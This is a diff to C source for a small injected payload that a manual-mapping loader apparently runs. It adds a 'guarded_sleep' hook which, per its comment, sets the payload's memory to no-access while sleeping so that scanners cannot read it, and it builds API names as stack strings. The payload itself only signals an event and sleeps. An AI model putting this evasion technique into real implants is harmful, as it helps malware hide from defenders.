@@ -116,10 +116,19 @@ typedef HANDLE (__attribute__((ms_abi)) *fnCreateEventA)(void *, BOOL, BOOL, con
 typedef BOOL   (__attribute__((ms_abi)) *fnSetEvent)(HANDLE);
 typedef void   (__attribute__((ms_abi)) *fnSleep)(DWORD);
 
+/*
+ * If the mapper passes a guarded_sleep function pointer via CreateThread's
+ * param, the payload calls it instead of Sleep. The guarded_sleep runs from
+ * the mapper's .text, flips the payload pages to PAGE_NOACCESS before
+ * sleeping (blocking reads/writes/scans), then flips back to PAGE_EXECUTE
+ * on wake. If param is NULL, falls back to plain Sleep.
+ */
+typedef void (__attribute__((ms_abi)) *fnGuardedSleep)(DWORD);
+
 __attribute__((section(".text"), ms_abi))
 unsigned long payload_entry(void *param)
 {
-    (void)param;
+    fnGuardedSleep guarded_sleep = (fnGuardedSleep)param;
 
     char k32[]  = {'k','e','r','n','e','l','3','2','.','d','l','l',0};
     char sCA[]  = {'C','r','e','a','t','e','E','v','e','n','t','A',0};
@@ -138,5 +147,10 @@ unsigned long payload_entry(void *param)
     HANDLE evt = pCreateEvent(0, 1, 0, sEvt);
     if (evt) pSetEvent(evt);
 
-    for (;;) pSleep(1000);
+    for (;;) {
+        if (guarded_sleep)
+            guarded_sleep(1000);
+        else
+            pSleep(1000);
+    }
 }
